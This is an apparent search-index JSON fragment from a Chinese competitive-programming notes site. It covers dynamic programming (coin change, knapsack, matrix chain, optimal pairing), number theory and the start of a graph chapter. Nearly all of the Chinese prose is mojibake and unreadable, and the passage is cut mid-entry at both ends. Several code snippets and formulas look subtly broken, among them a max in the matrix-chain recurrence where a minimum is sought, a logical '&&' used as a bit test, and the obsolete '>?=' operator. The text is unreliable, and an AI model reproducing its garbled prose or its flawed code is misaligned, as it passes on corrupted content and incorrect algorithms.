Sï¼Œå¯ä»¥é€‰ç”¨å¤šå°‘ä¸ªç¡¬å¸ä½¿å¾—é¢å€¼åªå’Œä¸º Sã€‚\nè¾“å‡ºæ»¡è¶³æ¡ä»¶çš„ç­–ç•¥ä¸­ï¼Œç¡¬å¸æ•°é‡çš„æœ€å¤§å€¼å’Œæœ€å°å€¼ã€‚\n è¿™ä¸ªé—®é¢˜åŒæ ·å¯ä»¥ç”¨ DAG æ¥å»ºæ¨¡ï¼ŒæŠŠæ¯ç‚¹çœ‹ä½œâ€œè¿˜éœ€è¦å‡‘è¶³çš„é¢å€¼â€ï¼Œå¯¹äºè¿˜éœ€è¦å‡‘è¶³ i çš„é¢å€¼è®¾ä¸º $r(i)$ï¼Œåˆ™åˆå§‹çŠ¶æ€ä¸º $r(S)$ï¼Œç›®æ ‡çŠ¶æ€ä¸º $r(0)$ã€‚\næ³¨æ„åˆ°æœ€å¤§ä¸æœ€å°æ˜¯ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬ä»¥æœ€å¤§å€¼ä¸ºä¾‹ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š\nint dp(int S) {  int\u0026amp; ans = d[S];  if (ans != -1) return ans;  ans = -1 \u0026lt;\u0026lt; 30;  for (int i = 1; i \u0026lt;= n; i++) if (S \u0026gt;= V[i]) ans \u0026gt;?= dp(S-V[i])+1;  return ans; }  æ³¨æ„ï¼Œç”¨ ans != -1 è€Œä¸æ˜¯ ans \u0026gt;= 0ï¼Œå¯ä»¥åŒºåˆ†â€œæ— æ³•åˆ°è¾¾â€ä¸â€œè¿˜æ²¡ç®—è¿‡â€è¿™ä¸¤ç§æƒ…å†µï¼›  å¯¹äºéœ€è¦åŒæ—¶è®¡ç®—æœ€å¤§å€¼çš„æœ€å°å€¼çš„æƒ…å†µï¼Œä½¿ç”¨é€’æ¨è€Œä¸æ˜¯è¿­ä»£æ›´åˆé€‚ï¼š\nmin[0] = max[0] = 0; for (int i = 1; i \u0026lt;= S; i++) {  min[i] = INF; max[i] = -INF; } for (int i = 0; i \u0026lt;= S; i++) \tfor (int j = 1; j \u0026lt;= n; j++)  if (i \u0026gt;= V[j])  {  min[i] \u0026lt;?= min[i - V[j]] + 1;  max[i] \u0026gt;?= max[i - V[j]] + 1;  } printf(\u0026#34;%d %d\\n\u0026#34;, min[S], max[S]); è°ƒè¯•æ–¹å¼ #  å¯¹äºä¸Šé¢çš„ä¸¤ä¸ªé¢˜ç›®ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•æ‰“å°å­—å…¸åºè·¯å¾„ï¼š\nvoid print_ans(int i) {  printf(\u0026#34;%d \u0026#34;, i);  for (int j = 1; j \u0026lt;= n; j++) if (G[i][j] \u0026amp;\u0026amp; d[i] == d[j]+1)  {  print_ans(j);  break;  } } å› ä¸º d çš„å«ä¹‰æ˜¯â€œä»¥ i ä¸ºèµ·ç‚¹çš„æœ€é•¿è·¯å¾„â€ï¼Œæ‰€ä»¥ä¸Šé¢çš„æ–¹æ³•æ‰“å°å­—å…¸åºæ˜¯å¯è¡Œçš„ã€‚å¦ä¸€æ‰“å°å­—å…¸åºçš„æ–¹å¼å°±æ˜¯åœ¨è®¡ç®—çš„è¿‡ç¨‹ä¸­æŠŠè·¯å¾„è®°å½•ä¸‹æ¥ã€‚\nåŒºåˆ†â€œæ— æ³•åˆ°è¾¾â€ä¸â€œè¿˜æ²¡ç®—è¿‡â€å¯ä»¥å•ç‹¬å»ºç«‹ä¸€ä¸ª vis æ•°ç»„ã€‚\n0-1 èƒŒåŒ…é—®é¢˜ #  DAG çš„çŠ¶æ€ #   ç‰©å“æ— é™èƒŒåŒ…é—®é¢˜ï¼šæœ‰ n ä¸­ç‰©å“ï¼Œæ¯ç§å‡æœ‰æ— ç©·å¤šä¸ªã€‚ç¬¬ i ç§ç‰©å“çš„ä½“ç§¯ä¸º $V_i$ï¼Œé‡é‡ä¸º $W_i$ã€‚é€‰ä¸€äº›ç‰©å“è£…åˆ°ä¸€ä¸ªå®¹å™¨ä¸º C çš„èƒŒåŒ…ä¸­ï¼Œä½¿å¾—åœ¨èƒŒåŒ…å†…ç‰©å“çš„æ€»ä½“ç§¯ä¸è¶…è¿‡ C çš„å‰æä¸‹ï¼Œé‡é‡å°½é‡çš„å¤§ã€‚\n è·Ÿç¡¬å¸é—®é¢˜ç±»ä¼¼ï¼Œè¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨ä¸€ä¸ªå¸¦æƒçš„ DAG å»ºæ¨¡ã€‚\n 0-1 èƒŒåŒ…é—®é¢˜ï¼šæœ‰ n ç§ç‰©å“ï¼Œæ¯ç§åªæœ‰ä¸€ä¸ªã€‚ç¬¬ i ç§ç‰©å“çš„ä½“ç§¯ä¸º $V_i$ï¼Œé‡é‡ä¸º $W_i$ã€‚é€‰ä¸€äº›ç‰©å“è£…åˆ°ä¸€ä¸ªå®¹é‡ä¸º C çš„èƒŒåŒ…ä¸­ï¼Œä½¿å¾—èƒŒåŒ…åœ¨ç‰©å“çš„æ€»ä½“ç§¯ä¸è¶…è¿‡ C çš„å‰æä¸‹å°½é‡æœ€å¤§ã€‚\n æˆ‘ä»¬å‘ç°å¥—ç”¨ä¸Šé¢çš„æ¨¡å‹å·²ç»ä¸é€‚ç”¨äº†ã€‚æˆ‘ä»¬å¯ä»¥å‚è€ƒå›æº¯æ³•ä¸­ï¼Œâ€œé˜¶æ®µâ€çš„æ¦‚å¿µï¼ŒæŠŠ n ç§ç‰©å“çš„é€‰ä¸ä¸é€‰çš„ä¸¤ç§çŠ¶æ€ç†è§£ä¸ºä¸€é¢—å†³ç­–æ ‘çš„ä¸¤ä¸ªæ‰©å±•è¿‡ç¨‹ã€‚\näºæ˜¯å¦‚æœæˆ‘ä»¬å¯ä»¥ç”¨ d(i, j) è¡¨ç¤ºå½“å‰åœ¨ç¬¬ i å±‚ï¼ˆå³å·²ç»åšäº† i æ¬¡å†³ç­–ï¼‰ï¼Œå‰©ä½™å®¹é‡ä¸º j æ—¶æ¥ä¸‹æ¥çš„é‡é‡å’Œï¼Œé‚£ä¹ˆå¯ä»¥å¾—åˆ°çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š\n $d(i, j) = max{d(i+1, j), d(i+1, j - V_i) + W_i}$ PSï¼šä¸Šè¿°å…¬å¼å³ï¼Œæ¯æ¬¡å†³ç­–çš„çŠ¶æ€ç”±ä¸‹ä¸€æ¬¡å†³ç­–æ˜¯å¦å†³å®šä¸¤ç§çŠ¶æ€çš„æœ€å¤§å€¼ç¡®å®šã€‚  è§„åˆ’æ–¹å‘ #  å¯¹äº 0-1 èƒŒåŒ…é—®é¢˜ï¼Œæˆ‘ä»¬å®¹æ˜“å¾—å‡ºä¸€ä¸ªå¯¹ç§°çš„è§£æ³•ï¼š\n $f(i, j) = max{f(i-1, j), f(i - 1, j -V_i) + W_i}$ PSï¼šè·Ÿä¸Šé¢çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹æ˜¯å®Œå…¨å¯¹ç§°çš„ï¼Œå†³ç­–æ ‘æ‰©å±•æ–¹å‘æ°å¥½ç›¸åã€‚  è¿™ä¸ªæ‰©å±•æ–¹å‘çš„å¥½å¤„æ˜¯ï¼šæˆ‘ä»¬ä¸éœ€è¦å¤šä½™çš„å†…å­˜æŠŠ V å’Œ W ä¿å­˜ä¸‹æ¥ï¼š\nfor (int i = 0; i \u0026lt;= n; i++) {  scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;V, \u0026amp;W);  for (int j = 0; j \u0026lt;= C; j++) {  f[i][j] = (i == 1 ? 0 : f[i-1][j]);  if (j \u0026gt;= V) f[i][j] \u0026gt;?= f[i-1][j-V] + W;  } } æ»šåŠ¨æ•°ç»„ #  ä¸ºäº†é™ä½ç©ºé—´å¤æ‚åº¦ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥æŠŠ f é™æˆä¸€ç»´çš„ï¼š\nmemset(f, 0, sizeof(f)); for (int i = 0; i \u0026lt;= n; i++) {  scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;V, \u0026amp;W);  for (int j = C; j \u0026gt;= 0; j--)  if (j \u0026gt;= V) f[j] \u0026gt;?= f[j-V] + W; } é€’å½’ç»“æ„ä¸­çš„åŠ¨æ€è§„åˆ’ #   æœ€ä¼˜çŸ©é˜µé“¾ä¹˜ï¼šç»™å‡º n ä¸ªçŸ©é˜µç»„æˆçš„åºåˆ—ï¼Œç¬¬ i ä¸ªçŸ©é˜µ $A_i$ çš„æ˜¯ $p_{i-1} \\times p_i$ çš„ï¼Œè®¾è®¡ä¸€ç§æ–¹æ³•æŠŠå®ƒä»¬ä¾æ¬¡ä¹˜èµ·æ¥ï¼Œä½¿å¾—è¿ç®—é‡æœ€å°ã€‚\n å› ä¸ºçŸ©é˜µçš„ä¹˜æ³•æ»¡è¶³ç»“åˆå¾‹è€Œä¸æ»¡è¶³äº¤æ¢å¾‹ã€‚ä¸åŒä¼˜å…ˆçº§çš„ä¹˜æ³•è®¡ç®—æ–¹å¼ï¼Œåˆ™ä¼šæœ‰ä¸åŒçš„è®¡ç®—é‡ã€‚\næˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªå­é—®é¢˜ $f(i, j) \\Rightarrow \\text{è¿ç®—æ¬¡æ•°}(\\prod_{k = i}^{j} A_k)$ ï¼ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š\n  $f(i, j) = max{f(i, k) + f(k, j) + p_{i-1}p_kp_j}$\n  è¿ç®—çš„è¾¹ç•Œä¸º $f(i, i) = 0$\n  è¿™ä¸ªé—®é¢˜çš„ç‰¹æ®Šæ€§åœ¨äºï¼šä¸åŒäº DAG ä¸Šçš„åŠ¨æ€è§„åˆ’ï¼Œè¿™é‡Œçš„åŠ¨æ€è§„åˆ’åœ¨è®¡ç®—æ—¶æ— è®ºæ˜¯æŒ‰ç…§ i è¿˜æ˜¯ j çš„é€’å¢æˆ–é€’å‡çš„é¡ºåºå‡ä¸æ­£ç¡®ã€‚æ›´åˆç†çš„æ–¹æ³•æ˜¯æŒ‰ç…§ j-i é€’å¢çš„æ–¹å¼é€’æ¨ã€‚\n æœ€ä¼˜ä¸‰è§’å½¢åˆ’åˆ†ï¼šå¯¹äºä¸€ä¸ª n ä¸ªé¡¶ç‚¹çš„å‡¸å¤šè¾¹å½¢ï¼Œæœ‰å¾ˆå¤šç§æ–¹æ³•å¯ä»¥å¯¹ä»–è¿›è¡Œä¸‰è§’åˆ¨åˆ†ï¼Œå³ç”¨ n-3 æ¡äº’ä¸ç›¸äº¤çš„å¯¹è§’çº¿æŠŠå‡¸å¤šè¾¹å½¢åˆ†æˆ n-2 ä¸ªä¸‰è§’å½¢ã€‚\nä¸ºæ¯ä¸ªä¸‰è§’å½¢è§„å®šä¸€ä¸ªæƒå‡½æ•° w(i, j, k)ï¼Œæ±‚è®©æ‰€æœ‰ä¸‰è§’å½¢æƒå’Œæœ€å¤§çš„åˆ†å‰²æ–¹æ¡ˆã€‚\n ç›¸å¯¹äºâ€œæœ€ä¼˜çŸ©é˜µé“¾ä¹˜ç§¯â€ï¼Œè¿™ä¸ªé—®é¢˜çš„ç‰¹æ®Šæ€§åœ¨äºï¼šæˆ‘ä»¬æ²¡æœ‰ä¸€ä¸ªæ¸…æ™°çš„å†³ç­–è¿‡ç¨‹ã€‚\næˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªçŠ¶æ€ $f(i, j)$ è¡¨ç¤ºä»é¡¶ç‚¹ i åˆ°é¡¶ç‚¹ j æ‰€æ„æˆçš„å­å¤šè¾¹å½¢çš„æœ€å¤§ä¸‰è§’å½¢åˆ¨åˆ†åŠå’Œï¼Œå³å¯å¾—åˆ°ä¸€ä¸ªæ¸…æ™°çš„å†³ç­–è¿‡ç¨‹ã€‚\nè¿™æ ·æˆ‘ä»¬å°±æŠŠå†³ç­–èµ·ç‚¹è®¾ç½®ä¸ºä»»æ„çš„ f(1, 1)ï¼Œå¯ä»¥è¯æ˜ä»ä»»ä½•ä¸€ä¸ªé¡¶ç‚¹ä½œä¸ºèµ·ç‚¹å¼€å§‹ï¼Œä¸å½±å“å†³ç­–ç»“æœã€‚å¯ä»¥å¾—åˆ°çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š\n $f(i, j) = max{f(i, k) + f(k, j) + w(i,j,k)}$   æ ‘çš„æœ€å¤§ç‹¬ç«‹é›†ï¼šå¯¹äºä¸€é¢— n ä¸ªèŠ‚ç‚¹çš„æ— æ ¹æ ‘ï¼ˆå³æ— ç¯æ— å‘å›¾ï¼‰ï¼Œé€‰å‡ºå°½é‡å¤šçš„èŠ‚ç‚¹ï¼Œä½¿å¾—ä»»æ„ä¸¤ä¸ªèŠ‚ç‚¹å‡ä¸ç›¸é‚»ï¼Œåˆ™æˆ‘ä»¬ç§°è¿™äº›èŠ‚ç‚¹æ„æˆçš„é›†åˆç§°ä¸ºâ€œæœ€å¤§ç‹¬ç«‹é›†â€ã€‚\nç»™å®š n-1 æ¡æ— å‘è¾¹ï¼Œè¾“å‡ºä¸€ä¸ªæœ€å¤§ç‹¬ç«‹é›†ã€‚\n åŒæ ·çš„æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¸…æ™°çš„å†³ç­–è¿‡ç¨‹ï¼Œæˆ‘ä»¬æŠŠä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹è®¾ç½®ä¸ºæ ¹èŠ‚ç‚¹ï¼Œå³å¯è‡ªé¡¶å‘ä¸‹è¿›è¡Œé€’å½’ã€‚\nå¯¹äºæ¯ä¸ªèŠ‚ç‚¹ i åªæœ‰ä¸¤ç§å†³ç­–ï¼šé€‰æˆ–ä¸é€‰ã€‚è¿™ä¸¤ç§åˆ†åˆ«å¯¹äºä¸åŒçš„å†³ç­–ç»“æœï¼Œå¯ä»¥å¾—åˆ°çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š\n $\\displaystyle d(i) = max{1 + \\sum_{j \\in grand_son(i)} d(j), \\sum_{j \\in son(i)} d(j)}$  é›†åˆä¸Šçš„åŠ¨æ€è§„åˆ’ #   æœ€ä¼˜é…å¯¹é—®é¢˜ï¼šç©ºé—´ä¸­æœ‰ n ä¸ªç‚¹ $P_0, \\cdots, P_{n-1}$ï¼Œn ä¸ºå¶æ•°ã€‚å¯ä»¥æœ‰å¤šç§æ–¹å¼å°†è¿™ n ä¸ªç‚¹é…å¯¹æˆ n/2 ä¸ªæ•°å¯¹ï¼Œæ±‚ä¸€ç§é…å¯¹æ–¹å¼æ˜¯çš„æ‰€æœ‰ç‚¹å¯¹ä¸­ä¸¤ç‚¹è·ç¦»ä¹‹å’Œæœ€å°çš„é‚£ç§é…å¯¹æ–¹å¼ã€‚\n å¤šé˜¶æ®µå†³ç­–ï¼š\n å…ˆç¡®å®š $P_0$ è¦å’Œè°é…å¯¹ï¼Œä»¥æ­¤ç±»æ¨æœ€åç¡®å®š $P_{n-1}$ è¦å’Œè°é…å¯¹ã€‚  çŠ¶æ€ï¼š\n $d(i, S) \\Rightarrow$ å‰ i ä¸ªç‚¹ç»„æˆçš„é›†åˆ Sï¼Œå…ƒç´ ä¸¤ä¸¤åŒ¹é…çš„æœ€å°å€¼ï¼› æ³¨æ„åˆ° i å®é™…ä¸Šå°±æ˜¯ S è¿™ä¸ªé›†åˆä¸­çš„æœ€å¤§å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ d(S) æ¥æ›´ç®€æ´åœ°è¡¨ç¤ºè¿™ä¸ªçŠ¶æ€  çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š\n $d(i, S) = min{|P_iP_j| + d(i - 1, S - {i} - {j}) | j \\in S}$ ä¼˜åŒ–ï¼š$d(S) = min{|P_iP_j| + d(S - {i} - {j})| j \\in S, i = max{S}}$  é’ˆå¯¹äºè¿™ä¸ªé¢˜ç›®ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªè¡¨ç¤ºé›†åˆçš„æ–¹æ³•ï¼Œå¯ä»¥ç”¨ä¸‹è¡¨æ ‡{0, 1, 2, ..., n-1} å”¯ä¸€è¡¨ç¤ºä¸€ä¸ªå…ƒç´ ï¼Œç„¶åæœ‰äºŒè¿›åˆ¶ç¼–ç è¡¨ç¤ºä¸€ä¸ªå­é›†ã€‚\nä»£ç å®ç°ï¼š\nfor (int S = 0; S \u0026lt; (1\u0026lt;\u0026lt;n); S++) {  int i, j;  d[S] = INF; \tfor (int i = 0; i \u0026lt; n; i++) if (S \u0026amp;\u0026amp; (1 \u0026lt;\u0026lt; i)) break;  for (j = i+1; j\u0026lt;n; j++) if (S \u0026amp; (1\u0026lt;\u0026lt;j))  d[S] \u0026lt;?= dist(i, j) + d[S^(1 \u0026lt;\u0026lt; i)^(1\u0026lt;\u0026lt;j)]; } æ€»ç»“ #  æˆ‘ç†è§£åŠ¨æ€è§„åˆ’çš„æœ¬è´¨æ˜¯å¯¹å›æº¯çš„â€œç©ºé—´æ¢æ—¶é—´â€ä¼˜åŒ–ï¼Œå½“ä¸€ä¸ªé—®é¢˜çš„å†³ç­–è·¯å¾„è¿‡é•¿ï¼Œä½†æ˜¯å†³ç­–ç©ºé—´åœ¨ä¸€å®šèŒƒå›´å†…æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®—è¿™ä¸ªå†³ç­–ç©ºé—´ä¸­çš„æ‰€æœ‰æƒ…å†µï¼Œæ¥è¿­ä»£å¼åœ°è®¡ç®—å‡ºåŸé—®é¢˜çš„è§£ã€‚\nåŠ¨æ€è§„åˆ’ä¸€èˆ¬å¯ä»¥æ‹†åˆ†æˆä»¥ä¸‹çš„å‡ æ­¥ï¼š\n å†³ç­–ï¼šæ‰¾å‡ºä¸€ä¸ªå¤šé˜¶æ®µå†³ç­–æ–¹å¼ï¼› çŠ¶æ€ï¼šç¡®å®šä¸€ç§èƒ½å¤Ÿå”¯ä¸€æè¿°ä¸€ä¸ªå†³ç­–ä¸­é—´çŠ¶æ€çš„æ–¹æ³•ã€‚çŠ¶æ€è¡¨ç¤ºæœ‰ä»¥ä¸‹çš„ä¸¤ä¸ªæ ¸å¿ƒè€ƒè™‘ç‚¹ï¼š  çŠ¶æ€çš„å‚æ•°ã€ç»´åº¦ï¼šå¯ä»¥ç”¨ç©·ä¸¾çš„å˜é‡å‚æ•°åšå‚æ•°ï¼ŒäºŒç»´çš„æ—¶é—´å¤æ‚åº¦ $$O(n^2)$$ã€‚ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªé›†åˆçš„å­é›†åšå‚æ•°ï¼Œå•ä¸ªé›†åˆçš„æ—¶é—´å¤æ‚åº¦æ˜¯ $$O(2^n)$$ï¼› çŠ¶æ€çš„å¯¹åº”çš„å€¼ï¼šå€¼æ˜¯ä¸ºçŠ¶æ€è½¬ç§»æ–¹ç¨‹æœåŠ¡çš„ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°å­—ã€ç»“æ„ã€bool å€¼ç­‰ï¼›   è½¬ç§»ï¼šåˆ—ä¸¾å‡ºçŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€‚  ä¼˜åŒ–æ–¹å¼ï¼š\n åŠ¨æ€è§„åˆ’é€šå¸¸å­˜åœ¨ä¸¤ç§è§„åˆ’æ–¹å‘ï¼Œæœ‰çš„æ–¹å‘å¯ä»¥èŠ‚çœç©ºé—´ï¼› æ»‘åŠ¨æ•°ç»„ä¸€èˆ¬å¯ä»¥æŠŠç©ºé—´å¤æ‚åº¦ä» $$O(n^2)$$ é™ä½åˆ° $$O(n)$$  "},{"id":360,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/3.%E6%95%B0%E5%AD%A6%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%96%B9%E6%B3%95/","title":"3.æ•°å­¦æ¦‚å¿µä¸æ–¹æ³•","section":"ç®—æ³•ç«èµ›å…¥é—¨ç»å…¸","content":"æ•°å­¦æ¦‚å¿µä¸æ–¹æ³• #  æ•°è®ºåˆæ­¥ #  æœ€å¤§å…¬å› æ•°ç®—æ³• #  è¾—è½¬ç›¸é™¤æ³•ï¼Œæˆ–æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆEuclid Algorithmï¼‰ï¼š\nint gcd(int a, int b) {  return (b == 0) ? a : gcd(b, a%b); } å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé€šè¿‡ gcd å¯ä»¥è®¡ç®—å‡º lcmï¼š\nint lcm(int a, int b) {  return a / gcd(a, b) * b; } æœ‰ä¸€ä¸ªç»†èŠ‚æ˜¯å…ˆé™¤åä¹˜å¯ä»¥é¿å…æ•´æ•°æº¢å‡ºï¼›\nç´ æ•°å®šç† #  Eratosthenes ç­›æ³•ï¼š\nint m = sqrt(n + 0.5); int c = 0; memset(vis, 0, sizeof(vis)); for (int i = 2; i \u0026lt;= m; i++) if (!vis[i]) {  prime[c++] = i;  for (int j = i*i; j \u0026lt;= n; j += i) vis[j] = 1; } ç´ æ•°å®šä¹‰ï¼š\n $$\\displaystyle \\pi(x) \\sim \\frac{x}{ln(x)}$$ï¼Œå…¶ä¸­ $$\\pi(x)$$ è¡¨ç¤ºä¸è¶…è¿‡ x çš„ç´ æ•°æ•°é‡ï¼›  æ¬§å‡ é‡Œå¾—æ‰©å±•ç®—æ³• #  æ¬§å‡ é‡Œå¾—æ‰©å±•ç®—æ³•æ‰¾å‡ºä»¥ä¸‹é—®é¢˜è§£çš„ä¸€ç§ç®—æ³•ï¼š\n å¯¹äºä»»æ„çš„æ•´æ•° a,bï¼Œæ‰¾å‡ºæ–¹ç¨‹çš„ $$ax + by = gcd(a, b)$$ çš„æ•´æ•°è§£ (x, y)ã€‚  æ‰¾å‡ºä¸€ç»„è§£ï¼š\nvoid gcd(int a, int b, int\u0026amp; d, int\u0026amp; x, int\u0026amp; y) {  if (!b) { d = a; x = 1; y = 0; }  else { gcd(b, a%b, d, y, x); y -= x*(a/b); } } é€šè¿‡ä¸€ç»„è§£å¯ä»¥æ¨å¯¼å‡ºå…¶ä»–çš„è§£ã€‚\nè¿™ä¸ªç®—æ³•çš„ä¸€ä¸ªæ ¸å¿ƒåº”ç”¨å°±æ˜¯æ±‚é€†å…ƒï¼Œæ¯”å¦‚ a å…³äº b çš„é€†å…ƒ $$a * a^{-1} \\equiv 1 \\pmod{b}$$ï¼Œå¯ä»¥å…ˆæ„é€ æ–¹ç¨‹ $$ax + by = 1$$ï¼Œæ–¹ç¨‹çš„è§£ x å³ä¸º a å…³äº b çš„é€†å…ƒã€‚\næ’åˆ—ä¸ç»„åˆ #  äºŒé¡¹å¼å®šç† #  äºŒé¡¹å¼å®šç†çš„ç³»æ•°å’Œæ¨è¾‰ä¸‰è§’ä¸€æ ·ï¼š\n $$\\displaystyle (a + b)^n = \\sum_{k = 0}^{n} C_n^ka^{n - k}b^k$$  ç»„åˆæ•° $$C_n^k$$ çš„è®¡ç®—ï¼Œå¯ä»¥åˆ©ç”¨æ•°å­¦é€’æ¨å…¬å¼ $$\\displaystyle C_n^k = \\frac{n - k + 1}{k} C_n^{k-1}$$ï¼š\nmemset(C, 0, sizeof(C)) C[0] = 1; for (int i = 1; i \u0026lt;= n; i++) C[i] = C[i - 1] * (n - i + 1) / i; æ¬§æ‹‰å‡½æ•° #  è€ƒè™‘è¿™ä¸ªé—®é¢˜ï¼š\n ç»™å‡ºæ­£æ•´æ•° n çš„å”¯ä¸€åˆ†è§£å¼ $$n = p_1^{a_1} \\cdots p_k^{a_k}$$ï¼Œæ±‚å°äº n ä¸”ä¸ n äº’ç´ çš„æ•°å­—çš„ä¸ªæ•°ã€‚  ä¸Šé¢è¿™ä¸ªé—®é¢˜çš„è§£å³ç§°ä¸ºæ¬§æ‹‰å‡½æ•°ï¼š\n $$\\displaystyle \\varphi(n) = \\sum_{S \\subseteq {p_1, p_2,\\cdots, p_k}} (-1)^{|S|} \\frac{n}{\\prod_{p_i \\in S} p_i} = n (1 - \\frac{1}{p_1})\\cdots(1 - \\frac{1}{p_k})$$  åœ¨ sage ä¸­ï¼Œæ¬§æ‹‰å‡½æ•°å¯ä»¥ç›´æ¥ç”¨ euler_phi å‡½æ•°è®¡ç®—ï¼š\nfrom sage.all import * print(euler_phi(24), euler_phi(64), euler_phi(187), euler_phi(360)) # (8, 32, 160, 96) é€’æ¨ #  æ±‰è¯ºå¡”ã€Fibonacci æ•°åˆ—ã€Catalan æ•°ã€‚\n"},{"id":361,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/4.%E5%9B%BE%E8%AE%BA%E6%A8%A1%E5%9E%8B%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"4.å›¾è®ºæ¨¡å‹ä¸ç®—æ³•","section":"ç®—æ³•ç«èµ›å…¥é—¨ç»å…¸","content":"å›¾è®ºæ¨¡å‹ä¸ç®—æ³• #  å›¾çš„è¡¨ç¤ºæ–¹æ³• #  æœ¬ä¹¦ä¸­çš„å›¾é€šè¿‡ç©ºé—´å¤æ‚åº¦ $O(|V| + 3 * |E|)$ è¡¨ç¤ºï¼ˆæ— å‘å›¾çš„è¾¹éœ€è¦é€šè¿‡ä¸¤æ¡æœ‰å‘è¾¹è¡¨ç¤ºï¼‰ï¼š\n firstï¼šé•¿åº¦ä¸º $|V|$ çš„æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´  x è¡¨ç¤ºä» x å‡ºå‘çš„ç¬¬ä¸€æ¡è¾¹ï¼› uã€vï¼šé•¿åº¦ä¸º $|E|$ çš„æ•°ç»„ï¼Œåˆ†åˆ«å­˜å‚¨ç€è¾¹å…³è”çš„ä¸¤ä¸ªèŠ‚ç‚¹ï¼› nextï¼šé•¿åº¦ä¸º $|E|$ çš„æ•°ç»„ï¼Œè¾¹çš„é‚»æ¥é“¾è¡¨çš„ä¸‹ä¸€æ¡è¾¹ï¼›  æ ‘ #  æ— æ ¹æ ‘è½¬åŒ–ä¸ºæœ‰æ ¹æ ‘ #  è½¬åŒ–ä»£ç ï¼š\nvoid dfs(int u, int fa) {  int d = G[u].size();  for (int i = 0; i \u0026lt; d; i++)  {  int v = G[u][i];  if (v != fa) dfs(v, p[v] = u);  } } è¡¨è¾¾å¼æ ‘ #  äºŒå‰æ ‘æ˜¯è¡¨è¾¾å¼å¤„ç†çš„å¸¸ç”¨å·¥å…·ï¼Œå…¶ä¸­æ¯ä¸ªéå¶å­èŠ‚ç‚¹éƒ½è¡¨ç¤ºä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå®ƒçš„å·¦å­æ ‘æ˜¯è¿™ä¸ªè¿ç®—ç¬¦çš„ç¬¬ä¸€ä¸ªè¿ç®—æ•°ï¼Œå³å­æ ‘åˆ™æ˜¯è¿™ä¸ªè¿ç®—ç¬¦çš„ç¬¬äºŒä¸ªè¿ç®—æ•°ã€‚\nå¦‚ä½•é€šè¿‡ä¸€ä¸ªå­—ç¬¦ä¸²å»ºç«‹è¡¨è¾¾å¼æ ‘å‘¢ï¼Œæ–¹æ³•æœ‰å¾ˆå¤šç§ï¼ˆè¯¦è§ã€Šç¼–è¯‘åŸç†ã€‹ï¼‰ã€‚\næœ€å°ç”Ÿæˆæ ‘ #  åœ¨æ— å‘å›¾ä¸­ï¼Œè¿é€šä¸”ä¸å«åœˆçš„å›¾ç§°ä¸ºæ ‘ã€‚\nå¦‚æœç»™å®šæ— å‘å›¾ G=(V,E)ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ª E çš„å­é›†è¿æ¥äº† V ä¸­çš„æ‰€æœ‰ç‚¹ï¼Œé‚£æˆ‘ä»¬ç§°è¿™ä¸ªå­é›†ä¸º G çš„ç”Ÿæˆæ ‘ï¼Œè€Œæƒå€¼æœ€å°çš„ç”Ÿæˆæ ‘åˆ™è¢«ç§°ä¸ºæœ€å°ç”Ÿæˆæ ‘ï¼ˆMinimal Spanning Tree, MSTï¼‰ã€‚\næ±‚ä¸€ä¸ª MST çš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œæœ€å¸¸è§çš„æœ‰ä¸¤ç§ï¼šKruskal ç®—æ³•å’Œ Prim ç®—æ³•ï¼Œhttps://zhihu.com/question/27566032/answer/287968877\nå¹¶æŸ¥é›† #  åœ¨ä¸Šé¢çš„æœ€å°ç”Ÿæˆæ ‘é—®é¢˜ä¸­ï¼Œæœ‰ä¸€ä¸ªå¸¸è§çš„å›¾è®ºé—®é¢˜è¦å¤„ç†ï¼š\n å¦‚ä½•åˆ¤æ–­å›¾ä¸­çš„ä¸¤ä¸ªç‚¹æ˜¯å¦å±äºåŒä¸€ä¸ªâ€œè¿é€šåˆ†é‡â€ï¼ˆå³ä¸€ä¸ªè¿é€šå›¾çš„æ‰€æœ‰ç‚¹çš„é›†åˆï¼‰ï¼› é€šè¿‡æ·»åŠ ä¸€ä¸ªè¾¹çš„æ–¹æ³•å°†ä¸¤ä¸ªâ€œè¿é€šåˆ†é‡â€åˆå¹¶ã€‚  ä¸Šé¢è¿™ä¸¤ä¸ªè¯‰æ±‚æœ‰è¿™æ ·çš„ç‰¹ç‚¹ï¼š\n 